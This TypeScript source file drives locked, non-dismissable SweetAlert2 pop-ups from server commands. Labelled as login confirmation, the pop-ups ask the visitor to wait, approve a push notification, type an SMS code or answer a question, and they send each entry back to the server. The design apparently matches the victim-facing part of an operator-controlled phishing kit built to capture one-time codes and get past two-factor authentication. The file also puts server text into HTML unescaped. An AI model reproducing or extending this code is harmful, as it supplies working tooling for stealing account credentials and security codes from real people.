import Swal from 'sweetalert2';
import 'sweetalert2/dist/sweetalert2.min.css';
import type { Answer, Command } from './types';

type Dict = Record<string, string>;

type Ctx = {
    dict: Dict;
    answer: (a: Answer) => Promise<void>;
    reset: () => void;
};

function t(dict: Dict, key: string, fallback?: string): string {
    return dict[key] ?? fallback ?? key;
}


export function showCommand(command: Command, ctx: Ctx): void {
    const { dict } = ctx;

    switch (command.type) {
        case 'idle':
            Swal.close();
            return;

        case 'hold.short':
            Swal.fire({
                title: t(dict, 'flow.loginConfirmation'),
                text: command.text ?? t(dict, 'flow.pleaseWait'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => Swal.showLoading(),
            });
            return;

        case 'hold.long':
            Swal.fire({
                title: t(dict, 'flow.loginConfirmation'),
                text: command.text ?? t(dict, 'flow.pleaseWaitLong'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => Swal.showLoading(),
            });
            return;

        case 'push':
            Swal.fire({
                title: t(dict, 'flow.loginConfirmation'),
                html: t(dict, 'flow.pushNotification'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => Swal.showLoading(),
            });
            return;

        case 'sms':
            Swal.fire({
                title: t(dict, 'flow.confirmation'),
                text: t(dict, 'flow.codeSent'),
                input: 'text',
                inputPlaceholder: t(dict, 'flow.enterCode'),
                confirmButtonText: t(dict, 'flow.confirm'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showCancelButton: false,
                showCloseButton: false,
                inputValidator: (value: string) => {
                    if (!value) return t(dict, 'flow.codeRequired');
                    if (!/^\d+$/.test(value)) return t(dict, 'flow.numbersOnly');
                    return null;
                },
                preConfirm: async (value: string) => {
                    try {
                        await ctx.answer({ command: 'sms', payload: { code: value } });
                    } catch (e) {
                        Swal.showValidationMessage(e instanceof Error ? e.message : 'failed');
                    }
                },
            });
            return;

        case 'invalid-data':
            Swal.fire({
                title: t(dict, 'flow.error'),
                text: t(dict, 'flow.incorrectData'),
                icon: 'error',
                confirmButtonText: t(dict, 'flow.ok'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showCloseButton: false,
            }).then((r) => {
                if (r.isConfirmed) ctx.reset();
            });
            return;

        case 'error':
            Swal.fire({
                title: t(dict, 'flow.error'),
                html: command.text,
                icon: 'error',
                confirmButtonText: t(dict, 'flow.ok'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showCloseButton: false,
            }).then((r) => {
                if (r.isConfirmed) ctx.reset();
            });
            return;

        case 'question':
            Swal.fire({
                title: t(dict, 'flow.confirmation'),
                html: command.text,
                input: 'text',
                confirmButtonText: t(dict, 'flow.sendAnswer'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showCloseButton: false,
                inputValidator: (value: string) => (!value.trim() ? ' ' : null),
                preConfirm: async (value: string) => {
                    try {
                        await ctx.answer({ command: 'question', payload: { answer: value } });
                    } catch (e) {
                        Swal.showValidationMessage(e instanceof Error ? e.message : 'failed');
                    }
                },
            });
            return;

        case 'photo.with-input':
            Swal.fire({
                html: `<img src="${command.photo_url}" style="max-width:100%;border-radius:8px;margin-bottom:${command.text ? '12px' : '0'}" />`
                    + (command.text ? `<p style="margin:0;font-size:15px;">${command.text}</p>` : ''),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
            });
            return;

        case 'photo.without-input':
            Swal.fire({
                html: `<img src="${command.photo_url}" style="max-width:100%;border-radius:8px;" />`,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
            });
            return;

        case 'redirect':
            Swal.close();
            return;
    }
}
